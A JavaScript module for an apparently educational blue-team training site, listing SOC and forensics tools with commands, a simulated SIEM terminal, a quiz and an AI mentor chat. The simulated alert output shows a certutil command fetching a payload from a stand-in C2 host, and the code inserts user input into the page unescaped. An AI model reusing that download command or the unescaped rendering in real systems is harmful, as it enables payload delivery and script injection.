// ==========================================
// PWNBOX MODULE 11: BLUE TEAM DEFENSE, SOC OPERATIONS & THREAT HUNTING
// Defensive Operations, SIEM Detection, and Memory Forensics Arsenal
// ==========================================
const apiKey = (typeof window !== "undefined" && window.GROQ_API_KEY) || 
                 (typeof GROQ_API_KEY !== "undefined" ? GROQ_API_KEY : "") || 
                 localStorage.getItem('pwnbox_groq_api_key') || 
                 "";

const MODULE_KEY        = 'module_socdefense_completed';
const CUSTOM_TOOLS_KEY  = 'soc_custom_tools';
const EDITED_TOOLS_KEY  = 'soc_edited_default_tools';
const DELETED_TOOLS_KEY = 'soc_deleted_default_indices';
const CUSTOM_CATS_KEY   = 'soc_custom_categories';

const defaultTools = [
    {
        name: "1. Sigma & Sysmon Correlation (Detection Engineering)",
        link: "https://github.com/SigmaHQ/sigma",
        category: "DetectionEngineering",
        brief: "The open standard for writing generic detection rules that compile into Splunk, Elastic, Microsoft Sentinel, and QRadar queries. Paired with Microsoft Sysmon (System Monitor), which provides high-fidelity host telemetry including Process Creation (Event ID 1), Network Connections (Event ID 3), and Process Injection (Event ID 8), Sigma rules detect adversary tradecraft regardless of the SIEM platform.",
        use: "Convert a Sigma rule to Splunk query using sigmac:<br><code>sigma convert -t splunk -p sysmon rules/windows/process_creation/proc_creation_win_certutil_download.yml</code><br>Inspect Sysmon Event ID 1 in PowerShell:<br><code>Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} -MaxEvents 10 | Format-List TimeCreated, Message</code>",
        useful: "Detection engineers write rules once in vendor-agnostic YAML. When adversaries use LOLBins (Living Off the Land Binaries) like certutil.exe or bitsadmin.exe, Sigma rules trigger alerts immediately across diverse enterprise SIEMs."
    },
    {
        name: "2. Zeek & Suricata (Network Threat Hunting & IDS/IPS)",
        link: "https://zeek.org",
        category: "NetworkDefense",
        brief: "Zeek (formerly Bro) is a passive, open-source network traffic analyzer that converts raw PCAP packets into structured, application-layer transaction logs (conn.log, http.log, dns.log, ssl.log). Suricata is a high-performance network threat detection and IDS/IPS engine capable of real-time packet inspection, TLS fingerprinting (JA3/JA4), and signature matching using Emerging Threats rulesets.",
        use: "Process PCAP file into structured Zeek logs:<br><code>zeek -r capture.pcap local</code><br>Find long-lived C2 beaconing connections in conn.log:<br><code>cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration orig_bytes resp_bytes | sort -nrk 4 | head -n 20</code><br>Run Suricata IDS on live interface:<br><code>suricata -c /etc/suricata/suricata.yaml -i eth0 -D</code>",
        useful: "Unlike conventional firewalls that only see IP and port headers, Zeek and Suricata reconstruct full protocols, reveal covert DNS tunneling, and identify Cobalt Strike beacons through abnormal packet intervals and JA3 TLS hash tracking."
    },
    {
        name: "3. Wazuh & Elastic Security (Open-Source XDR & SIEM)",
        link: "https://wazuh.com",
        category: "SIEMOperations",
        brief: "Wazuh is an enterprise-ready, open-source security monitoring solution integrating Host-based Intrusion Detection (HIDS), File Integrity Monitoring (FIM), vulnerability detection, and automated active response. Integrated with Elastic Stack (Elasticsearch, Logstash, Kibana), it indexes millions of security logs and maps adversary actions to the MITRE ATT&CK enterprise matrix in real time.",
        use: "Query Wazuh agent status via CLI:<br><code>/var/ossec/bin/agent_control -l</code><br>Check FIM (File Integrity Monitoring) alerts for system directory changes:<br><code>grep 'File integrity monitoring' /var/ossec/logs/alerts/alerts.log | tail -n 15</code><br>Initiate active response to block attacking IP:<br><code>/var/ossec/bin/firewall-drop.sh add - 203.0.113.45</code>",
        useful: "Gives SOC teams unified endpoint visibility, compliance monitoring (PCI-DSS, HIPAA, NIST), and real-time containment capabilities across hybrid multi-cloud infrastructure without multi-million dollar license costs."
    },
    {
        name: "4. YARA & Mandiant IOCs (Malware Pattern Matching)",
        link: "https://github.com/VirusTotal/yara",
        category: "MalwareAnalysis",
        brief: "The Swiss army knife of malware researchers and incident responders. YARA enables analysts to create textual and binary pattern-matching rules (strings, regular expressions, hex bytes, and PE header conditions) to classify and identify malware families, obfuscated scripts, and indicators of compromise (IOCs) across memory dumps and disk filesystems.",
        use: "Scan directory of suspicious executables against YARA ruleset:<br><code>yara -r rules/malware_rules.yar /opt/evidence/binaries/</code><br>Example YARA rule structure:<br><code>rule CobaltStrike_Beacon_Stager {<br>&nbsp;&nbsp;strings: $s1 = \"/wininet.dll\" $s2 = \"%s as %s\\\\%s: %d\"<br>&nbsp;&nbsp;condition: uint16(0) == 0x5A4D and ($s1 or $s2)<br>}</code>",
        useful: "Crucial during live forensics: when a hash-based check fails due to polymorphic re-compilation, YARA signatures match internal cryptographic routines or distinctive binary markers, instantly uncovering the threat family."
    },
    {
        name: "5. Volatility 3 (Advanced Memory Forensics)",
        link: "https://github.com/volatilityfoundation/volatility3",
        category: "DFIRForensics",
        brief: "The world's most widely used memory forensics framework for digital incident response. Volatility 3 analyzes raw RAM image acquisitions (from Windows, Linux, and macOS) to expose memory-only evasion techniques, such as DLL injection, process hollowing, rootkits, unlinked processes from the active process list, and injected shellcode residing in unbacked PAGE_EXECUTE_READWRITE memory pages.",
        use: "List running processes from raw memory dump:<br><code>python3 vol.py -f memdump.raw windows.pslist</code><br>Detect injected/hollowed code segments (malfind):<br><code>python3 vol.py -f memdump.raw windows.malfind</code><br>Enumerate active and closed network sockets:<br><code>python3 vol.py -f memdump.raw windows.netscan</code><br>Extract command-line arguments passed to processes:<br><code>python3 vol.py -f memdump.raw windows.cmdline</code>",
        useful: "Fileless malware and advanced threat actors operate purely in RAM without writing to disk. Volatility unmasks memory-resident payloads, dumps decrypted strings, and retrieves the adversary's actual execution timeline."
    },
    {
        name: "6. TheHive & Cortex (Security Incident Response)",
        link: "https://thehive-project.org",
        category: "IncidentResponse",
        brief: "A scalable, 4-in-1 open-source security incident response platform designed for SOCs, CSIRTs, and CERTs. Tight integration with Cortex enables analysts to automate observable analysis (IPs, domains, URLs, file hashes) across 100+ threat intelligence feeds (VirusTotal, AbuseIPDB, Shodan, MISP) with a single click, standardizing investigation playbooks and case timelines.",
        use: "Create new incident case via TheHive REST API:<br><code>curl -XPOST -H 'Authorization: Bearer $KEY' -H 'Content-Type: application/json' http://thehive:9000/api/case -d '{\"title\":\"Ransomware Outbreak Node-04\",\"severity\":3}'</code><br>Dispatch observable to Cortex analyzer:<br><code>cortex-cli --job-run VirusTotal_GetReport_3_0 --data '{\"data\":\"e3b0c44...\"}'</code>",
        useful: "Bridges the gap between detection and remediation. Facilitates multi-analyst collaboration, tracks chain of custody for digital evidence, and accelerates Mean Time to Respond (MTTR)."
    },
    {
        name: "7. Velociraptor (Live Enterprise Endpoint Triage)",
        link: "https://github.com/Velocidex/velociraptor",
        category: "EndpointHunting",
        brief: "An advanced digital forensic and incident response tool providing deep endpoint visibility. Utilizing the Velociraptor Query Language (VQL), security teams can query thousands of endpoints simultaneously in minutes to hunt for IOCs, inspect Master File Tables (MFT), query Windows Event Logs, collect prefetch files, and isolate infected machines from the corporate network.",
        use: "Collect Windows Shimcache & Prefetch across target endpoints:<br><code>velociraptor-v0.6.9 artifacts collect Windows.Forensics.Prefetch</code><br>Query running processes with specific command line arguments via VQL:<br><code>SELECT Pid, Name, CommandLine FROM pslist() WHERE CommandLine =~ 'powershell.*-enc'</code><br>Remotely quarantine an endpoint network interface:<br><code>velociraptor-v0.6.9 artifacts collect Windows.Remediation.Quarantine --args Hostname=FIN-WS-12</code>",
        useful: "Speed is paramount in threat hunting. Velociraptor enables a single analyst to sweep an entire 10,000-workstation enterprise for active threat indicators in under 15 minutes."
    }
];

// --- STORAGE & TOOL MANAGEMENT ---
function getStoredCustomTools() {
    return JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
}

function getAllTools() {
    const custom = getStoredCustomTools();
    return [...defaultTools, ...custom];
}

function renderToolList() {
    const list = document.getElementById('toolList');
    if (!list) return;
    list.innerHTML = '';
    const tools = getAllTools();

    tools.forEach((t) => {
        const item = document.createElement('div');
        item.className = 'tool-item';
        item.innerHTML = `
            <div style="font-weight: 700; color: var(--text-main); font-size: 0.88rem;">${t.name}</div>
            <div style="font-family: 'Space Mono', monospace; font-size: 0.68rem; color: #10b981; margin-top: 2px;">[${t.category}]</div>
        `;
        item.addEventListener('click', () => {
            document.querySelectorAll('.tool-item').forEach(el => el.classList.remove('active'));
            item.classList.add('active');
            renderToolDetails(t);
        });
        list.appendChild(item);
    });
}

function renderToolDetails(tool) {
    const panel = document.getElementById('detailsPanel');
    if (!panel) return;
    panel.innerHTML = `
        <div style="margin-bottom: 20px;">
            <div style="font-family: 'Space Mono', monospace; font-size: 0.72rem; color: #10b981; font-weight: 800; margin-bottom: 4px;">DEFENSIVE DISCIPLINE: ${tool.category}</div>
            <h2 style="font-size: 1.5rem; font-weight: 900; margin-bottom: 8px;">${tool.name}</h2>
            <a href="${tool.link}" target="_blank" style="font-family: 'Space Mono', monospace; font-size: 0.75rem; color: #10b981; text-decoration: underline;">🔗 Official Repository / SIEM Documentation ↗</a>
        </div>
        
        <div style="background: var(--bg-panel); border: 2px solid var(--border-dim); padding: 16px; margin-bottom: 16px; box-shadow: 3px 3px 0 var(--border-dim);">
            <h4 style="font-family: 'Space Mono', monospace; font-size: 0.82rem; margin-bottom: 6px; color: var(--text-main);">// ARCHITECTURAL OVERVIEW</h4>
            <p style="font-size: 0.88rem; line-height: 1.6; color: var(--text-muted);">${tool.brief}</p>
        </div>

        <div style="background: #010409; border: 2px solid var(--border-dim); padding: 16px; margin-bottom: 16px; color: #6ee7b7; font-family: 'Space Mono', monospace; box-shadow: 3px 3px 0 var(--border-dim);">
            <div style="font-size: 0.75rem; color: #10b981; font-weight: 800; margin-bottom: 8px;"># BLUE TEAM SYNTAX & DETECTION LOGIC</div>
            <div style="font-size: 0.8rem; line-height: 1.6; word-break: break-all;">${tool.use}</div>
        </div>

        <div style="background: var(--bg-panel); border: 2px solid var(--border-dim); padding: 16px; box-shadow: 3px 3px 0 var(--border-dim);">
            <h4 style="font-family: 'Space Mono', monospace; font-size: 0.82rem; margin-bottom: 6px; color: #38bdf8;">// SOC INCIDENT RESPONSE & TRIAGE UTILITY</h4>
            <p style="font-size: 0.88rem; line-height: 1.6; color: var(--text-muted);">${tool.useful}</p>
        </div>
    `;
}

// --- PANEL TAB SWITCHING ---
function switchPanelTab(tabName) {
    document.querySelectorAll('.panel-tab').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => {
        c.classList.remove('active');
        c.style.display = 'none';
    });

    if (tabName === 'chat') {
        const btn = document.querySelector(".panel-tab[onclick*='chat']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('chatTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    } else if (tabName === 'terminal') {
        const btn = document.querySelector(".panel-tab[onclick*='terminal']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('terminalTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    } else if (tabName === 'quiz') {
        const btn = document.querySelector(".panel-tab[onclick*='quiz']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('quizTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    }
}

// --- SIEM TERMINAL COMMAND SANDBOX ---
function handleTerminalEnter(e) {
    if (e.key === 'Enter') {
        const input = document.getElementById('terminalInput');
        const cmd = input.value.trim().toLowerCase();
        input.value = '';
        executeTerminalCommand(cmd);
    }
}

function executeTerminalCommand(cmd) {
    const output = document.getElementById('terminalOutput');
    if (!output) return;

    const row = document.createElement('div');
    row.style.marginBottom = '6px';
    row.innerHTML = `<span style="color: #6ee7b7;">soc-analyst@siem-node:~$</span> <span style="color: #ffffff;">${cmd}</span>`;
    output.appendChild(row);

    const res = document.createElement('div');
    res.style.marginBottom = '12px';

    if (cmd === 'help') {
        res.innerHTML = `
            <div style="color: #10b981; font-weight: bold;">AVAILABLE SOC & SIEM COMMANDS:</div>
            <div>- <b>sysmon-triage</b>: Ingest and correlate Sysmon Process Creation events (Event ID 1)</div>
            <div>- <b>sigma-check</b>: Validate and match Sigma detection rule against incoming event telemetry</div>
            <div>- <b>volatility-malfind</b>: Scan RAM memory dump for injected shellcode and hollowed processes</div>
            <div>- <b>zeek-conn</b>: Parse live connection telemetry and isolate abnormal C2 beacon patterns</div>
            <div>- <b>clear</b>: Clear SIEM terminal display</div>
        `;
    } else if (cmd === 'sysmon-triage') {
        res.innerHTML = `
            <span style="color: #38bdf8;">[*] Querying Microsoft-Windows-Sysmon/Operational for High-Risk Event ID 1...<br/>
            [!] ALERT DETECTED [Severity: HIGH] | Time: 2026-11-06T18:42:01.120Z<br/>
            &nbsp;&nbsp;ProcessId: 4892 | ParentProcessId: 2104 (explorer.exe)<br/>
            &nbsp;&nbsp;Image: C:\\Windows\\System32\\certutil.exe<br/>
            &nbsp;&nbsp;CommandLine: certutil.exe -urlcache -split -f http://malicious-c2.corp/payload.dll C:\\temp\\payload.dll<br/>
            &nbsp;&nbsp;User: CORP\\jdoe | Hashes: SHA256=9A2F8B...<br/>
            [✓] CORRELATION: LOLBin certutil remote binary download flagged!</span>
        `;
    } else if (cmd === 'sigma-check') {
        res.innerHTML = `
            <span style="color: #10b981;">[*] Loading Sigma rule: proc_creation_win_certutil_download.yml...<br/>
            [+] Rule Metadata: Title: Remote File Download via Certutil | Author: SigmaHQ<br/>
            [+] Evaluating Event Stream against Selection Criteria (CommandLine: *urlcache* AND *split*)...<br/>
            [✓] RULE MATCH TRIGGERED! Score: 95/100<br/>
            &nbsp;&nbsp;Matched Event: PID 4892 (certutil.exe -urlcache -split...)<br/>
            &nbsp;&nbsp;Mitre ATT&CK ID: T1105 (Ingress Tool Transfer)</span>
        `;
    } else if (cmd === 'volatility-malfind') {
        res.innerHTML = `
            <span style="color: #f43f5e;">[*] Executing Volatility 3 plugin: windows.malfind on memory image memdump.raw...<br/>
            [!] SUSPICIOUS MEMORY PAGE FOUND [PID 3144 - svchost.exe]:<br/>
            &nbsp;&nbsp;Process: svchost.exe | PID: 3144 | Address: 0x0000018a00200000<br/>
            &nbsp;&nbsp;Protection: PAGE_EXECUTE_READWRITE | Vad: VadS<br/>
            &nbsp;&nbsp;Hex Dump: 4d 5a 90 00 03 00 00 00 ... MZ...... (PE Header Identified in Private Memory!)<br/>
            [✓] CRITICAL FORENSIC EVIDENCE: Injected shellcode detected in svchost.exe process space!</span>
        `;
    } else if (cmd === 'zeek-conn') {
        res.innerHTML = `
            <span style="color: #eab308;">[*] Inspecting conn.log and calculating connection frequency and jitter...<br/>
            [!] BEACONING PATTERN DETECTED:<br/>
            &nbsp;&nbsp;Source: 192.168.1.105:49812 -> Dest: 198.51.100.24:443 (External)<br/>
            &nbsp;&nbsp;Interval: Exactly 60.0s (+/- 0.8s jitter) across 180 continuous connections<br/>
            &nbsp;&nbsp;Avg Bytes Sent: 248 | Avg Bytes Recv: 1,420<br/>
            [✓] THREAT HUNTING FINDING: Persistent HTTP/TLS C2 beacon established to 198.51.100.24.</span>
        `;
    } else if (cmd === 'clear') {
        output.innerHTML = '';
        return;
    } else {
        res.innerHTML = `<span style="color: #ef4444;">Command not recognized. Type 'help' to view available SOC commands.</span>`;
    }

    output.appendChild(res);
    output.scrollTop = output.scrollHeight;
}

// --- QUIZ VERIFICATION ---
function checkQuizAnswer(qNum, correctVal) {
    const selected = document.querySelector(`input[name="q${qNum}"]:checked`);
    if (!selected) return;

    if (selected.value === correctVal) {
        if (typeof window.showCustomAlert === 'function') {
            window.showCustomAlert("✓ CORRECT!", "Outstanding! You correctly identified the defensive SOC principle.", "success");
        } else if (typeof window.tacticalAlert === 'function') {
            window.tacticalAlert({ title: "✓ CORRECT!", message: "Outstanding! You correctly identified the defensive SOC principle.", type: "success" });
        } else {
            alert("✓ CORRECT! That is the proper defensive SOC principle.");
        }
    } else {
        if (typeof window.showCustomAlert === 'function') {
            window.showCustomAlert("✕ INCORRECT", "Review the SOC, Sysmon, and memory forensic notes and try again.", "error");
        } else if (typeof window.tacticalAlert === 'function') {
            window.tacticalAlert({ title: "✕ INCORRECT", message: "Review the Blue Team defense notes and try again.", type: "danger" });
        } else {
            alert("✕ INCORRECT. Review the Blue Team defense notes.");
        }
    }
}

// --- AI MENTOR (GROQ INTEGRATION) ---
async function sendMessage() {
    const input = document.getElementById('chatInput');
    const msg = input.value.trim();
    if (!msg) return;

    const history = document.getElementById('chatHistory');
    const userDiv = document.createElement('div');
    userDiv.className = 'msg user';
    userDiv.textContent = msg;
    history.appendChild(userDiv);
    input.value = '';

    const botDiv = document.createElement('div');
    botDiv.className = 'msg bot';
    botDiv.textContent = 'Querying SOC Lead Mentor...';
    history.appendChild(botDiv);
    history.scrollTop = history.scrollHeight;

    try {
        let content = '';
        if (typeof window !== "undefined" && window.GroqService && window.GroqService.callGroqChat) {
            const data = await window.GroqService.callGroqChat({
                model: "llama-3.3-70b-versatile",
                messages: [
                    {
                        role: "system",
                        content: "You are an expert Blue Team Defender, SOC Incident Handler, and Threat Hunter on the PwnBox cybersecurity academy. Explain SIEM log correlation, Sysmon event IDs, Sigma rule generation, Volatility memory analysis, YARA patterns, and incident triage with clear, practical guidance."
                    },
                    { role: "user", content: msg }
                ],
                temperature: 0.5,
                max_tokens: 600
            });
            content = data.choices[0].message.content;
        } else {
            const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apiKey}`
                },
                body: JSON.stringify({
                    model: "llama-3.3-70b-versatile",
                    messages: [
                        {
                            role: "system",
                            content: "You are an expert Blue Team Defender, SOC Incident Handler, and Threat Hunter on the PwnBox cybersecurity academy. Explain SIEM log correlation, Sysmon event IDs, Sigma rule generation, Volatility memory analysis, YARA patterns, and incident triage with clear, practical guidance."
                        },
                        { role: "user", content: msg }
                    ],
                    temperature: 0.5,
                    max_tokens: 600
                })
            });

            if (!response.ok) throw new Error("API request failed");
            const data = await response.json();
            content = data.choices[0].message.content;
        }
        botDiv.textContent = content;
    } catch (e) {
        botDiv.textContent = "Downlink failed. Ensure Groq API key is valid in js/config.js or test commands in the SIEM CLI Sandbox tab.";
    }
    history.scrollTop = history.scrollHeight;
}

function handleEnter(e) {
    if (e.key === 'Enter') sendMessage();
}

// Module completion
function toggleModuleCompletion() {
    const isCompleted = localStorage.getItem(MODULE_KEY) === 'true';
    if (isCompleted) {
        localStorage.removeItem(MODULE_KEY);
        document.getElementById('completeModuleBtn').textContent = 'Mark Module Completed';
        document.getElementById('completeModuleBtn').style.background = '';
    } else {
        localStorage.setItem(MODULE_KEY, 'true');
        document.getElementById('completeModuleBtn').textContent = '✓ Module Completed!';
        document.getElementById('completeModuleBtn').style.background = '#10b981';
        if (typeof window.showCustomAlert === 'function') {
            window.showCustomAlert("MODULE COMPLETED!", "Module 11 (Blue Team Defense & SOC Operations) completion recorded in local dossier.", "success");
        }
    }
}

// Custom Tool Modal
function openAddToolModal() {
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.style.display = 'flex';
        setTimeout(() => modal.classList.add('active'), 10);
    }
}

function closeAddToolModal() {
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => { modal.style.display = 'none'; }, 200);
    }
}

function saveCustomTool() {
    const name = document.getElementById('customToolName').value.trim();
    const cat = document.getElementById('customToolCategory').value.trim();
    const desc = document.getElementById('customToolDesc').value.trim();
    const syn = document.getElementById('customToolSyntax').value.trim();

    if (!name || !cat) return;

    const list = getStoredCustomTools();
    list.push({
        name: name,
        category: cat,
        brief: desc || "Custom user tool.",
        use: syn || "No command provided.",
        useful: "Custom Blue Team addition.",
        link: "#"
    });
    localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(list));
    const form = document.getElementById('addToolForm');
    if (form) form.reset();
    closeAddToolModal();
    renderToolList();
    if (typeof window.showCustomAlert === 'function') {
        window.showCustomAlert("SOC TOOL ADDED", `${name} added to your private defensive arsenal!`, "success");
    }
}

// Initialization
document.addEventListener('DOMContentLoaded', () => {
    renderToolList();
    if (defaultTools[0]) renderToolDetails(defaultTools[0]);
    if (localStorage.getItem(MODULE_KEY) === 'true') {
        const btn = document.getElementById('completeModuleBtn');
        if (btn) {
            btn.textContent = '✓ Module Completed!';
            btn.style.background = '#10b981';
        }
    }
});

if (typeof window !== 'undefined') {
    window.defaultTools = defaultTools;
    window.getAllTools = getAllTools;
    window.executeTerminalCommand = executeTerminalCommand;
    window.toggleModuleCompletion = toggleModuleCompletion;
    window.saveCustomTool = saveCustomTool;
}
